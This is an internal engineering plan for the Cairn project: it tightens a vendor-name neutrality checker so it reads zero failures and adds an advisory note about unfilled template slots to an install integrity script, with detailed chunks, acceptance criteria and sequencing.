# Plan: neutrality and upgrade slots -- a vendor-name check that reads zero, and a note for slots an upgrade adds

**Source proposal**: `dev/proposals/archive/2026-10-17-claude-neutrality-and-upgrade-slots.md`
**Status**: revising-code
**Plan review**: required(Internal + Internal Security Review)
**Assurance path**: high-assurance -- inherited from the proposal: the work widens the neutrality checker, adds code to the lockfile reader adopters run before they trust their scripts (`bootstrap/verify_integrity.py`), and edits comments in two security-relevant scripts (the interpreter binding and the content scanner)
**Opened**: 2026-10-18

## In brief

Two of Cairn's checks cannot be trusted today, for opposite reasons. This plan fixes both in twelve small chunks, and writes the one paragraph the Maintainer also accepted for issue #16.

1. **The vendor-name check is always red.** Cairn promises to stay neutral about which AI tool a team uses, so nothing it ships to a project may name an AI vendor or our reference project. `python scripts/quality_gate.py --sub neutrality` enforces that. Every recorded run has been red, and it reports 74 failures today, so a new leak would be invisible, like a smoke alarm that is always ringing. The plan:
   * makes the check slightly stricter: it will also read comment lines, two more file types (`.json`, `.txt`) and four more tool names, which raises the count to 81;
   * rewrites every shipped leak (reviewer credits in comments, the reference project's name) and marks the illustrative mentions in Cairn's own documents, so the check reads **zero** (`fail=0`), without changing what any program does (a script shows each edited program is identical to its parent apart from comments and docstrings);
   * says plainly what zero covers: no listed name, as a whole word in its normal capitals, in the file types the check reads. It does not cover lower-case or joined spellings, hidden characters, names missing from the list, other file types, or someone hiding a name on purpose. Outside `templates/` (the folder that ships) a line or block that carries a `vendor-ok` marker is exempt by design, so `info=`, not `fail=`, is the only sign of a name added under a marker.
2. **When an upgrade adds a fill-in section, nothing says so (#8).** A *slot* is a section of a project's file that the project fills in; Cairn's placeholder sits there until it does. The plan adds an advisory note to the install integrity check (`bootstrap/verify_integrity.py`) that lists every slot still holding Cairn's placeholder text. It always says how much it was able to check, so silence means "none found" and never "could not look". It prints no commands, because a Security Review showed that a printed command could lead someone to approve a tampered file. It cannot change the result `verify()` returns. `bootstrap/UPGRADE.md` gains a step and a section on recording an edit you made.
3. **Issue #16's paragraph.** One paragraph in the doc-drift module names the third kind of documentation drift: prose that names a function the code no longer has. The code check #16 also asked for is not built.

**What it costs the Maintainer.** No engine change, so no hand re-anchor of the engine's fingerprint. Fourteen *frozen files* (files whose exact bytes the gate manifest records) change, so the next gate-manifest *re-anchor* (the supervised ceremony only the Maintainer runs) covers them. They join the queued row on `dev/PLANNING.md`, which this plan's opening commit updates. If that ceremony runs before this plan archives, a second pass is owed. Nothing is pushed.

**How we will know it worked.** The neutrality check reads `fail=0` and exits 0, the "green" the gate manifest already expects of it, and a planted leak makes it read 1. Every edited program file is shown identical to its parent apart from comments. A test shows that a bad lockfile entry cannot change the integrity check's verdict. One full test run (Boundary B) is recorded against one clean commit.

Two terms used below. A **twin** is Cairn's own installed copy of a shipped template; for example `tools/session.py` is a byte-identical copy of `templates/skills/_lib/session.py`, and the pair must stay identical. **Boundary A, B and C** are the three verification jobs in `AGENTS.md`: scoped iteration while building, one integration run on a clean commit, and the code reviewer's independent falsification.

## Source proposal

Accepted 2026-10-18 at `f4cff4be`. Revision 4 binds, over Revisions 1-3 as it states: Revision 2 is the last complete contract, Revision 3 replaces parts of it, and Revision 4 replaces parts of Revision 3. The Security Review obligation was cleared at `eca6ca1d`. The Decision accepted every recommended answer:

* **Q1(a) yes.** #16's proposed symbol-drift check is won't-build, under the three-recurrence rule, keeping its revival rule.
* **Q1(b) yes.** #16's one-paragraph half is written in the doc-drift module as a separate small change. It is chunk C11 here (see *Found while planning*).
* **Q2 not now.** `upgrade` does not name the slots it adds in this change. That rides with the next engine change to the upgrade path that already owes a re-anchor, or sooner if an adopter misses an upgrade-added slot. It is a `defer`, recorded in *Dispositions*.

The SR15-closure pass handed two non-blocking findings to the plan: SR17 (C10) and SR18 (already landed, see *Found while planning*).

## Scope

Measured at `fbf664f0`, the HEAD when this plan was written. The plan executes the accepted text; it does not re-argue it.

**Touched.**

| Surface | Files | Chunk |
|---|---|---|
| The checker | `scripts/quality_gate.py`; `bootstrap/tests/test_quality_gate_neutrality.py` | C1 |
| Routing table, session kernel, session-start skill | `templates/skills/_data/vendor_targets.yml`, `templates/skills/_lib/session.py`, `templates/skills/session-start/SKILL.md`; twins `.agents/skills/_data/vendor_targets.yml`, `tools/session.py`, `.agents/skills/session-start/SKILL.md` | C2 |
| Onboarding package and activation helper | `templates/modules/default-on/_onboarding/` (`__init__`, `activation`, `cli`, `security`, `shared`, `triggers`), `templates/modules/default-on/onboarding_activate.py`; twins `scripts/_onboarding/` (the same six) and `scripts/onboarding_activate.py` | C3 |
| Content scanner, intent tool | `templates/modules/team-gated/content_scan.py`, `templates/modules/team-gated/intent.py`; twins `scripts/content_scan.py`, `tools/intent.py` | C4 |
| Shipped Markdown | `templates/modules/default-on/documentation-plan.md`, `documentation_plan_template.md`, `incident-trackers.md`, `incident_log_template.md`; `templates/onboarding/solo-greenfield.md`; `templates/modules/team-gated/api-access-security.md`, `web-hosting-security.md`; twins `dev/modules/documentation-plan.md`, `dev/modules/incident-trackers.md`, `dev/modules/incident_log_template.md` | C5 |
| Cairn-internal prose | `bootstrap/tests/fixtures/skills/README.md`, `docs/DOCUMENTATION_PLAN.md`, `docs/agent-team-onboarding.md`, `doctrine/lifecycle-contract.md`, `doctrine/rationale.md` | C6 |
| The dogfood log | `doctrine/consolidation-review.md` | C7 |
| The install check | `bootstrap/verify_integrity.py`; `bootstrap/tests/test_verify_integrity.py` | C8, C9 |
| The upgrade guide | `bootstrap/UPGRADE.md` | C10 |
| The doc-drift paragraph | `templates/modules/team-gated/doc-drift-prevention.md`; twin `dev/modules/doc-drift-prevention.md` | C11 |
| Cairn's own install record | `dev/.cairn/cairn-lock.yml`, scoped finalize of 12 records | C2-C5 |
| Board and changelog | `dev/PLANNING.md` (the opening commit joins the re-anchor row); `CHANGELOG.md` (the archive commit) | opening, archive |

**Not touched**, each checked by `git diff --stat` over the implementation range (C12): `bootstrap/_scaffold/` and `bootstrap/scaffold.py` (so **no AST impact**), `bootstrap/tests/_gate_manifest.py` and the gate-manifest fixture, `AGENTS.md` and `templates/core/AGENTS.md`, every `doctrine/` file except the two marker edits (C6) and the log (C7), `scripts/check_model_selection.py`.

**Twins.** Sixteen template and twin pairs are edited: the fifteen in chunks C2-C5 (three skills files, seven onboarding files, two scanner and intent files, three Markdown modules) and the doc-drift pair in C11. All sixteen are byte-identical today (measured with `filecmp` and `cmp`). `docs/DOCUMENTATION_PLAN.md` is not a twin: it is Cairn's own customized copy of `templates/modules/default-on/documentation_plan_template.md` and differs from it. Each chunk edits the template, copies it to the twin, and checks the pair with `cmp` in the same commit.

### Frozen files and the AST baseline

**Frozen files: 14.** Read from `bootstrap/tests/fixtures/gate_manifest.json` > `frozen_files` (183 keys) and intersected with every file this plan edits by script. The instrument was checked against a known frozen key (`bootstrap/verify_integrity.py` is reported frozen). The 14:

* `scripts/quality_gate.py`, `bootstrap/tests/test_quality_gate_neutrality.py` (C1);
* `templates/modules/default-on/_onboarding/__init__.py`, `activation.py`, `cli.py`, `security.py`, `shared.py`, `triggers.py` and `scripts/onboarding_activate.py` (C3);
* `templates/modules/team-gated/content_scan.py` and `scripts/content_scan.py` (C4);
* `bootstrap/tests/fixtures/skills/README.md` (C6);
* `bootstrap/verify_integrity.py` and `bootstrap/tests/test_verify_integrity.py` (C8, C9).

Not frozen, though edited: every other file in the table, including `tools/session.py`, `tools/intent.py` and both `session.py` copies. The proposal's "up to 16" was an upper bound; the manifest gives 14. Changed frozen bytes do not redden `test_gate_manifest.py`, which verifies a freshly produced manifest and never diffs the committed fixture, so a green suite is no evidence that the re-anchor is paid. The pinned collection also grows: C1 adds 8 nodes to `test_quality_gate_neutrality.py` (22 pinned, 30 after), and C8-C9 add the nodes of `test_verify_integrity.py` (13 pinned, 19 collected at the base, so the ceremony already sees 6 new nodes there). Both join the re-anchor row already queued on `dev/PLANNING.md` (line 156 at the base). **The re-anchor is the Maintainer's alone** (`bootstrap/REANCHOR_RUNBOOK.md`); an implementing agent must not perform it. The opening commit adds the 14 paths to that row, marked as planned and not yet changed; the archive commit adds the node IDs.

Three ceremony facts for the Maintainer, measured.

* **A roster file.** `bootstrap/verify_integrity.py` is also on the differential oracle's refactor-sensitive roster (`bootstrap/tests/_oracle_activation.py:34-47`), and it already differs from the gate anchor `bd66a70c` (five commits since). The ceremony's sensitive-path check holds it until the Maintainer's activation scope covers it, whether or not this plan runs.
* **What stands behind that authorization.** The differential oracle does not run `verify_integrity`: it is a single-engine tool covered by the unit suite (`bootstrap/tests/_oracle.py:197-201`). So the evidence behind C8-C9 is the unit suite, the old-versus-new comparison C8 records, and the code review. The criteria below are therefore the only guard on an edit to a frozen test: C8 and C9 require that file's diff to add lines and remove none.
* **Two phase-mutable files.** `templates/modules/team-gated/intent.py` (C4) and `templates/modules/default-on/onboarding_activate.py` (C3) are in the gate manifest's `phase_mutable` set (`PHASE_SPLIT_TARGETS` in `bootstrap/tests/_gate_manifest.py`), not its frozen set. Changing either gives a `PHASE-CHANGED` note at the ceremony and never a hold. `intent.py` matches its recorded hash today, so C4 makes the note new; `onboarding_activate.py` already differs.

**AST: no change.** No file under `bootstrap/_scaffold/` and not `bootstrap/scaffold.py` is edited, and `bootstrap/verify_integrity.py` keeps its two engine imports (`bootstrap._scaffold.lockfile` and `trusted_upstream`) and adds standard-library imports only. The baseline `bootstrap/tests/fixtures/scaffold_ast_baseline.json` is already not clean at the base, for other work: on a clean extraction of `fbf664f0`, `python bootstrap/tests/_ast_attest.py verify` reports 2 CHANGED symbols (`main` in `bootstrap/_scaffold/cli.py`, `seed_gitignore` in `bootstrap/_scaffold/install.py`) and `test_ast_attest.py` fails 2 of 30 nodes for that reason. The AST re-anchor is Maintainer-only and not this plan's. C12 derives the set again at the tested commit's parent and at the tested commit and requires them equal.

**Lockfile.** Twelve of Cairn's own lockfile records attest edited twins that match their record today, and are scoped-finalized in the commit that edits them (precedent `2ea3f869`): `.agents/skills/_data/vendor_targets.yml`, `tools/session.py`, the six `scripts/_onboarding/` modules, `scripts/onboarding_activate.py`, `tools/intent.py`, `scripts/content_scan.py`, `dev/modules/incident_log_template.md`. Four edited files are already among Cairn's 18 integrity violations and are **left alone**, so the count does not grow: `.agents/skills/session-start/SKILL.md`, `dev/modules/documentation-plan.md`, `dev/modules/incident-trackers.md`, `docs/DOCUMENTATION_PLAN.md`. `dev/modules/doc-drift-prevention.md` (C11) is a fifth, also already among the 18. The 18 at the base (measured with `python bootstrap/verify_integrity.py --target .`): `.agents/skills/session-end/SKILL.md`, `.agents/skills/session-start/SKILL.md`, `AGENTS.md`, `dev/README.md`, `dev/agent_collaboration.md`, `dev/measurement/README.md`, `dev/modules/claim-check.md`, `dev/modules/doc-drift-prevention.md`, `dev/modules/documentation-plan.md`, `dev/modules/incident-trackers.md`, `dev/plans/_template.md`, `dev/proposals/_template.md`, `dev/rules/README.md`, `dev/strategy/_template.md`, `dev/upstream/README.md`, `docs/DOCUMENTATION_PLAN.md`, `scripts/claim_check.py`, `tools/_intent/conflict.py`. The lockfile schema is untouched.

### Found while planning

* **#16 is already closed on GitHub, before its paragraph exists.** A read-only `gh issue view 16` on 2026-10-18 shows `CLOSED`, state reason `COMPLETED`, closed 15:57 UTC. The paragraph is not in `templates/modules/team-gated/doc-drift-prevention.md` at the base. The Decision said "#16 closes when it lands", so the issue is no longer a live home for the work; the plan carries it (C11). The plan makes no GitHub change. Whether the closure reason should read "not planned" is the Maintainer's call.
* **SR18 already landed.** `7c077ddf` (the same minute as the SR15 closure) removed "or its history since install" from the hint and added the assertion `history misses uncommitted edits` to `test_a_filled_customized_slot_is_pointed_at_finalize`. C9 keeps it true; no new work.
* **Marker form.** Markers on their own line would shift every later line of the file. `independent-scientific-check` cites `doctrine/rationale.md:405`, `:414-417` and `:451`, and several archived records cite `doctrine/lifecycle-contract.md` by line. The gate also accepts a marker at the end of the hit line (`<!-- vendor-ok: reason -->`), which it reads as a one-line exemption; I checked this on a scratch tree with the unmodified checker. C6 uses that same-line form wherever the hit is prose, adds no line, and shifts no citation. A hit inside a code fence cannot take a same-line marker without changing the example (`docs/agent-team-onboarding.md:37-38`), so there a block marker wraps the fence; that is the one block wider than its hit lines.
* **The solo-greenfield paragraph is counted by a test.** `test_onboarding_review_tiers.py` requires exactly three paragraphs in `templates/onboarding/solo-greenfield.md` that name both "External" and "tier". The credit at line 92 sits in a paragraph with "External" and no "tier"; rewording it must not add the word "tier" there (C5).
* **A comment citing lines of `verify_integrity.py` is already stale.** `templates/modules/default-on/run_security_verification.py` (line 128) and `bootstrap/tests/test_security_verification.py` (line 944) cite `bootstrap/verify_integrity.py:63-111`, which no longer bounds the record loop; C8 and C9 add well over a hundred lines to that file, so the citations drift further. Not widened: both files are frozen, and re-pointing would add two frozen files and a twin. Disposition: a board row, put to the Maintainer with the Q2 deferral at archive (*Dispositions*), to re-point both by function name when either file is next edited.
* **Live line citations into this plan's files**, searched across the open plans and proposals at `69d3ac59`: `board-as-basis` cites `templates/skills/session-start/SKILL.md:43-45`; `stewardship-and-reuse` (issue #30, in revision) cites `scripts/quality_gate.py:498` and `doctrine/rationale.md:407-431` and `:447`. `claim_check` only checks that a cited line is in bounds, so drift would be silent. The SKILL.md lines and the `rationale.md` lines are protected by criteria (C2: the file's line count is unchanged; C6: no line is added to `rationale.md`). `scripts/quality_gate.py:498` is `_R1_SCAN_ROOTS`, which moves by design when C1 edits the lines above it, so C1's commit body records its new line number and the later plan re-points its citation.
* **The five comment sites in the checker** sit one line off the proposal's numbers at the base: `scripts/quality_gate.py:197-200`, `:252`, `:434-439`, `:446`, `:454-459`.
* **Rows in the log table quote tokens.** The dogfood log's table lives inside one `vendor-ok` block, so new rows go inside it, before its end marker (C7).

### Plan decisions the proposal left open

The proposal fixes the note's content, not its shape. These are choices this plan makes; plan review may overrule any of them.

* **D1 Where the note speaks.** It prints to stderr, like the fork advisory and the existing hint. Every line it prints begins `slot note:`, so tests can separate the note's lines from the hint's (the SR16 test needs this) and so a person can tell them apart.
* **D2 Names.** The entry point is `_slot_note`, called from `verify()` inside a fence. Its parameters are fixed in C8.
* **D3 When it runs.** On both exits of `verify()` (the OK path and the violations path), after the report and the exit code are fixed. It does not run on the fail-closed early returns (no lockfile, a lockfile with no files).
* **D4 The warning and the pointer** print once per run, when the note lists at least one slot or counts at least one file as failed the integrity check, and not at all otherwise; a run with nothing to act on prints only the coverage line. Revision 4 says "once per run, after the list" and does not say what a run with an empty list prints; a warning about recording an edit, printed when there is nothing to record, is the noise the accepted text itself worries about. This reads the sentence one way, so *Scope delta* names it (C9 tests both cases).
* **D5 Not-checked reasons.** A missing `base_cache` is "no base copy"; a `base_cache` that is present but unusable (not a string, a NUL byte, outside `dev/.cairn/base/`, a symlinked part, cannot be opened, not a regular file, over the cap, not UTF-8) is "unreadable"; a base copy whose bytes do not hash to a string `base_hash` is "base hash mismatch"; a non-verbatim record that did not pass the integrity pass is "failed the integrity check"; an unusable `tokens` mapping, installed bytes that are over the cap or not UTF-8, a slot body whose substituted length would exceed the cap, and any per-record exception count as "unreadable". A bad `tokens` mapping must not fall back to "no substitution", because that would make every templated slot read as filled, which is the silent miss the coverage line exists to prevent.
* **D6 The pointer's target.** The note points to `bootstrap/UPGRADE.md` > *Recording an edit you made*. One test (C10) pins that a heading of exactly that name exists, since a code string naming a heading is not a link that `check_cairn.py` resolves.
* **D7 Scope of the check.** "Files in scope" are the non-verbatim records, living-state records included (verbatim ones are scripts that hold no slots). Living-state files are read through the same reader as base copies, with the same component-by-component symlink walk; the integrity loop's `resolve()` containment has already kept an escaping `dst` out before the note sees it. No hash vouches for a living-state file, so this reader is the only guard on it.
* **D8 Plan review.** The proposal's header says `required(Internal)`. This plan declares `required(Internal + Internal Security Review)`: `AGENTS.md` asks for it where the surface calls for security treatment, and the Security Review handed build details (SR12, SR17) to the plan.

### Documentation / doctrine surface

| Layer | Files |
|---|---|
| Governing | none; `AGENTS.md` > "Vendor-neutrality" stays true |
| Doctrine | marker-only edits in `doctrine/lifecycle-contract.md` and `doctrine/rationale.md`; log rows in `doctrine/consolidation-review.md` |
| Descriptive | `bootstrap/UPGRADE.md`; `docs/DOCUMENTATION_PLAN.md` (stale lines); `docs/agent-team-onboarding.md` (markers) |
| Module text | `templates/modules/team-gated/doc-drift-prevention.md` and its twin (C11) |
| Deliberation | this plan; `dev/PLANNING.md` (the re-anchor row; at archive, the deferral row) |
| Changelog | one entry, written by the archive commit |

The rate-limit gate (`doctrine/rationale.md` > "Adaptive-doctrine rate-limit gate") is not triggered: the markers change no rule, and `doctrine/consolidation-review.md` prescribes this disposition. The proposal's fallback (leave the 8 doctrine lines unmarked, so the gate reads `fail=8`) is part of the accepted text but would lose the "zero" outcome, so invoking it is a scope reduction and takes the Maintainer's word. Marker reasons are text `templates/modules/team-gated/content_scan.py` skips (its `_CAIRN_MARKER_RE`), so only the injection review of `bootstrap/SAFETY.md` Rule 7 reads them; C6 checks each is short and declarative.

## Sequence

The rows are in run order, and the labels C1-C12 keep the reviews' and the Response's references, so C10 runs before C9. All commits go to `master`; nothing is pushed.

| # | Chunk | Gate | Ships |
|---|---|---|---|
| C1 | **The stricter checker.** `scripts/quality_gate.py` reads whole-line comments in `templates/`, reads `.json` and `.txt` there, and gains four names; its five misdescribing comments are corrected. Eight new nodes. The gate moves from 74 to 81 and only up. | `ready-to-implement` | one commit |
| C11 | **#16's paragraph.** One paragraph names prose that cites a symbol the code no longer has; the "no tool ships" and revival sentences sit beside the module's other not-shipped statement. It depends on nothing, so it runs right after C1. | `ready-to-implement` | one commit |
| C2 | **The routing table and the session kernel.** The 9 hits and the 4 new names in `templates/skills/` are reworded (comments, docstrings, one `_doc` string); twins follow; two records are finalized. | C1 | one commit |
| C3 | **The onboarding package.** The 27 hits (26 in the six `_onboarding` modules, 1 in `onboarding_activate.py`) are reworded in comments and docstrings; twins follow; seven records are finalized. | C1 | one commit |
| C4 | **The content scanner and the intent tool.** The 3 hits are reworded; twins follow; two records are finalized. | C1 | one commit |
| C5 | **The shipped Markdown.** 8 hits in five templates, plus the 3 `reviewer=` credits in two security modules, are reworded; three twins follow; one record is finalized. | C1 | one commit |
| C6 | **Cairn's own prose.** The fixture credit and the stale "not self-hosted" lines are reworded; the illustrative mentions in four files are marked with same-line markers. | C1 | one commit |
| C7 | **Zero, and the log.** The gate is run and must read `fail=0`; plants, the superset check and the one-time search are recorded; the pass is logged. | C2-C6 | one commit |
| C8 | **The note's frame.** `verify()` fixes its verdict and prints its report, then calls `_slot_note` inside a fence, by added lines only. The note's reader opens base copies and living-state files safely and prints the coverage line. | `ready-to-implement` | one commit |
| C10 | **The upgrade guide.** `bootstrap/UPGRADE.md` gains step 4, what the note means, the known gap, and the section *Recording an edit you made*. It runs before C9, so the pointer C9 prints already resolves. | C8 | one commit |
| C9 | **The listing.** The note finds slots still holding Cairn's text and prints them, with a warning and a pointer and no commands. | C8, C10 | one commit |
| C12 | **Boundary B, then the record.** One full run on one clean commit; the result is written down. Status moves to `awaiting-code-review`. | C1-C11 | one commit |

**Run order and commits.**

* **C10 before C9.** C9's note points to the section *Recording an edit you made*. With C10 first the pointer resolves from the first commit that prints it, and the pointer test (`test_the_pointer_names_a_heading_that_exists`, in C9) is green from birth. C12 re-reads the guide against the finished note.
* **C11 early.** It depends on nothing, and a stall in the security-heavy C8-C10 should not hold a paragraph the Maintainer already accepted.
* **C2, C3 and C4 may land as one commit.** They are one kind of work (comment-only code, proved by the same script, finalized with the same scoped command). One commit means one fresh read of the lockfile and one finalize of 12 records instead of three contended ones. If they do, the body carries each chunk's K1-K4 record under its label. They stay three chunks here so that the reviews' references hold.
* **C7 stays its own commit.** It is the first commit at which the gate reads zero, so `git show` of one commit anchors the claim and the log rows. Folding it into C6 would save a commit and lose that anchor.
* C8 to C10 do not depend on C1 to C7 and may run first. The finalizes in C2-C5 touch `dev/.cairn/cairn-lock.yml`, a file other plans also finalize: each such commit reads the file fresh, names it by path, and checks the lockfile diff before committing (K4).

**M -- MAINTAINER-ONLY: the re-anchor.** Not a chunk of this plan and not performed by it. The Maintainer runs the gate-manifest ceremony over the changed frozen files and the new nodes (`bootstrap/REANCHOR_RUNBOOK.md`); **an implementing agent must not perform it.** The agent's part is the board note at archive. No new ceremony and no Waiting line in this plan: the wait is already declared on the marked board row.

### Sequencing with the later plans

This plan runs first. The expected order after it: `independent-scientific-check` (plan D, open); the combined plan `review-stance-and-lenses` (opened at `8cc124b5` from the stance and lenses proposals, which both archived into it; it recommends going third); then `model-mapping-install-path` and `board-as-basis` (accepted, no plan yet); and `stewardship-and-reuse` (issue #30, a proposal in revision, which follows the combined plan). The shared files below were re-read from each one's own text at `69d3ac59`. Where one edits a file this plan also edits, it re-reads the file at edit time and rebases on this plan.

**Everything they ship is held to the stricter checker from C1 on.** Any shipped text they add under `templates/` is scanned in comment lines and in `.json` and `.txt` files, and the names Copilot, Windsurf, Cline and OpenCode now count. After C7 the baseline is zero, so a new failure is theirs; the combined plan's own neutrality criterion becomes "stays zero".

| File | This plan | Later plan | What to know |
|---|---|---|---|
| `templates/onboarding/solo-greenfield.md` line 92 and `test_onboarding_review_tiers.py` | C5 rewords the credit, with the file's line count unchanged; the test runs unedited | `review-stance-and-lenses` rewords the External-tier paragraphs and deletes the test (its C7) | C first: it finds the line reworded and compares against zero. Its C5 criterion needs the old pin passing, so C5's run is the test's last use |
| `doctrine/rationale.md`, `doctrine/lifecycle-contract.md`, `docs/agent-team-onboarding.md` | C6: same-line markers; no line is added to any of the three, except two own-line block markers around a fence in `agent-team-onboarding.md` | the combined plan rewrites the anchor, wording and examples (its C4, C6); `stewardship-and-reuse` cites `doctrine/rationale.md:407-431` and `:447` | no shift in `rationale.md` or `lifecycle-contract.md`; a marked line they rewrite keeps or drops its marker deliberately, and the gate says which |
| `templates/skills/session-start/SKILL.md` and `.agents/skills/session-start/SKILL.md` | C2: one phrase near line 28, with the file's line count unchanged | the combined plan changes "review tier, plan-review tier" in the board paragraph (its C3); `board-as-basis` cites lines 43-45 and does not edit them | three plans, three different sentences; lines 43-45 hold |
| `bootstrap/UPGRADE.md` | C10: step 4 in "The workflow", a known-gap line, a new section | the combined plan edits the plan-pass schema rows (its C5) | different sections |
| `scripts/quality_gate.py` | C1 | `stewardship-and-reuse` cites line 498 (`_R1_SCAN_ROOTS`) | C1's body records the new line number; the later plan re-points it |
| `dev/.cairn/cairn-lock.yml` | C2-C5: 12 records | the combined plan finalizes three module copies; `model-mapping-install-path` and `board-as-basis` each finalize or edit other records | one file, disjoint records |
| `dev/PLANNING.md`, `CHANGELOG.md` | the opening commit (the re-anchor row); the archive commit | every plan | commit by path, read fresh |
| `docs/DOCUMENTATION_PLAN.md` | C6: six stale lines | cited as the routing procedure by several | read, not edited, by them |
| `templates/skills/_lib/session.py`, `tools/session.py`, `scripts/onboarding_activate.py` | C2, C3: comments only | `model-mapping-install-path` names them as not touched | no overlap in practice |

`bootstrap/tests/test_verify_integrity.py` is named by `board-as-basis` as a test to run, not edited. The combined plan does not name `scripts/_onboarding/triggers.py`, `bootstrap/tests/fixtures/skills/README.md` or `dev/modules/incident-trackers.md`, which the stance proposal alone did.

## Acceptance criteria

**Reading these criteria.** Each ends with *Red when*: a change that turns it red. Prose checks use `count(file, section, phrase)`: the number of times a fixed phrase occurs in a section, taken on whitespace-collapsed text. These are one-shot checks the implementer runs and records in the chunk's commit body; no standing test pins new prose unless a criterion says so. Boundary C attacks the prose.

### Checks every rewording chunk repeats (C2-C6)

Each chunk's commit body records the result of the checks that apply to it.

* **K1 -- the gate moves the right way.** Run `python scripts/quality_gate.py --sub neutrality` at the chunk's parent and at its commit. Strip each FAIL line's message tail, sort, and `comm` the two lists. Lines only in the parent are exactly the chunk's hits (the counts below); lines only in the commit are none. *Red when* a FAIL line appears that the parent lacked.
* **K2 -- the comment-only proof**, for every edited `.py` (procedure under *Verification*). (a) The docstring-stripped `ast.dump` of the new file equals the parent's. (b) No added or removed line in the file's diff matches `nosec`, `noqa`, `pragma`, `type:` or an encoding declaration. (c) The instrument fires: a one-character code change in a scratch copy of each edited `.py` makes (a) read DIFFERENT, and a scratch diff with `# noqa` makes (b) print a hit. (d) Docstrings are ignored by (a) and are readable at run time, so none of the edited modules may read its own: `grep -n "__doc__\|get_docstring\|getdoc"` over the edited files prints nothing (control: the same grep finds `__doc__` in files under `bootstrap/tests/`). *Red when* any file reads DIFFERENT, (b) or (d) prints a line, or a control does not fire.
* **K3 -- twins.** `cmp` of each template and its twin exits 0, and the pairs the chunk touches are listed in the body. *Red when* either copy was edited alone.
* **K4 -- the lockfile.** For the chunk's attested twins only, one scoped `python bootstrap/scaffold.py upgrade --target . --finalize <path> ...` runs in the same commit. `git diff -U0 dev/.cairn/cairn-lock.yml` shows changes only to the `"hash"` lines of exactly those records. Each advanced `hash` equals the SHA-256 of its template as committed (`git show <commit>:<template> | shasum -a 256`), so a reviewer can confirm it from the commit alone. `python bootstrap/verify_integrity.py --target .` lists the same 18 files as at the base and none of the chunk's finalized files. *Red when* a record outside the chunk changes, a hash differs from the template's, or the 18 grow.
* **K5 -- the reason survives.** For each reworded reviewer credit the commit body quotes the old text beside the new text and says, in code terms, what the old comment explained (or that it explained nothing, being only a credit). `modflow_tools` becomes "the reference deployment" or is dropped. This turns the reviewer's before-and-after reading into a lookup. The harm is recoverable: the old comments stay in `git log -p`. *Red when* the body omits the old text, or a credit is deleted along with an explanation a reader needed.

There is no per-chunk name search and no per-chunk slot check. C7's one-time search is the accepted one and covers every chunk's lines (an implementer may run it early as a habit; that is not a criterion). The Markdown templates this plan edits hold no `cairn:slot` marker at all (C2 and C5 and C11 each record `grep -c cairn:slot` returning 0 on their files, with `dev/plans/_template.md` as the control returning 3), so no edit can reach a slot body and set off the reworded-placeholder gap (C9).

### C1 -- The stricter checker

Frozen: `scripts/quality_gate.py`, `bootstrap/tests/test_quality_gate_neutrality.py`.

* **Eight new nodes, red before the code.** In `test_quality_gate_neutrality.py`, five functions, one parametrized: a vendor name in a whole-line HTML comment in `templates/` fails; in a `.txt` file there fails; in a `.json` file there fails; each of Copilot, Windsurf, Cline and OpenCode in a `templates/` file fails (one function over four names: 4 nodes); a whole-line `vendor-ok` directive in `templates/` that also names a vendor yields two failures, the directive's and the name's. Run them at C1's parent in a throwaway `git worktree` with only the new test file copied in (the tests load `scripts/quality_gate.py` from the tree they sit in); each fails on an assertion, not an import error. The body names the parent SHA. *Red when* a node passes at the parent, or `pytest --collect-only -q` shows other than 8 more nodes (22 before, 30 after).
* **The 22 existing nodes pass unchanged**, and the test file's diff is additions only. *Red when* an existing node is edited.
* **The count moves 74 to 81 and only up (the superset check).** In a throwaway worktree at C1's parent, run the parent's checker and C1's checker over the same tree. Every FAIL line of the old is in the new, and the new has exactly seven more: `templates/modules/team-gated/api-access-security.md:101`, `templates/modules/team-gated/web-hosting-security.md:70` and `:93` (the `reviewer="Claude (Implementation)"` credits), and the four added names on `templates/skills/_data/vendor_targets.yml:2`. Counts: `fail=74 info=21` before, `fail=81 info=21` after. This also shows the four names add nothing outside `templates/`. I prototyped it on a scratch copy of the base: 74 within 81, the same seven. *Red when* an old line is missing, or a new line is outside the seven.
* **Only failures are added.** The diff of `scripts/quality_gate.py` consists of: four names added to `_VENDOR_DENYLIST`; the two-line skip in the `templates/` branch removed (`:278-279`); `.json` and `.txt` added to the `templates` entry only; comment text. The skip in the non-template branch (a directive-only line carries no prose tokens) is untouched, so exemption reasons that name vendors still pass outside `templates/`. The `Last updated` comment above the denylist is advanced and the commit body names why the four were added (the routing table itself lists them). No exemption is added. *Red when* the diff touches the non-template branch's skip or adds any allowance.
* **The five comment sites describe the scan truly** (`:197-200`, `:252`, `:434-439`, `:446`, `:454-459` at the base). The instrument is `grep -n "directive-forbidden\|Not bootstrap/tests/" scripts/quality_gate.py`: at the parent it prints five lines, one per site (199, 252, 438, 446, 457, measured at `69d3ac59`); a narrower pattern such as "only for the directive-forbidden" matches three and would pass with two sites still wrong. Afterwards the sites say: `templates/` is scanned for tokens, comment lines included, as well as for the directive rule; the file types read there now include `.json` and `.txt`; matching is whole-word and case-sensitive; `bootstrap/tests/` **is** scanned under the `bootstrap` root (`.md` only). Every line the grep still prints belongs to a sentence that also says tokens are scanned, or it prints nothing; the commit body quotes all five sites before and after. *Red when* a site still says templates are scanned only for directives.
* **Line numbers.** The commit body records the new line number of `_R1_SCAN_ROOTS` (`:498` at the base), which `stewardship-and-reuse` cites.
* **Standing gates.** `python scripts/quality_gate.py --sub redundancy` reads `fail=0`; `test_security_lint.py` (the Bandit gate over `scripts/`) passes. The neutrality gate reads 81 at this commit, and C1's body says why that is expected.

### C2 -- The routing table and the session kernel

Hits at the base: 13 in these three files once C1's four names count (5 on `vendor_targets.yml:2`, 4 added, 3 in `templates/skills/_lib/session.py` at `:215`, `:905`, `:1338`, 1 in `templates/skills/session-start/SKILL.md:28`). Finalize: `.agents/skills/_data/vendor_targets.yml`, `tools/session.py`.

* **K1** with the 13 lines. **K2** for `session.py`. **K3** for three pairs. **K4** for two records.
